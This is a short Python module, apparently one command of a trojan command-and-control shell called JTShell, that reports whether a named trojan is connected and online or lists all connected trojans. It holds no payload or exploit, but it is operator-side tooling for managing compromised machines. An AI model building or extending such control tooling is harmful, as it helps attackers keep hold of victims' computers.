__author__ = 'Jonas'
from JTShell.util.error import ProcessError


def run(process, trojan=""):
    shell = process.shell
    shell.client.update()
    if trojan != "":
        # checking wether the connected trojan i within the client cache
        if trojan in shell.client.cache:
            if trojan in shell.client.available:
                return "Trojan {0} is online and connected".format(trojan)
            else:
                raise ProcessError("Trojan {0} is connected, but doesnt seem to be online anymore".format(trojan))
        else:
            return "Trojan {0} is not connected".format(trojan)
    else:
        if len(shell.client.cache) == 0:
            raise ProcessError("There are no trojans connected")
        else:
            return shell.client.get_info_cached()
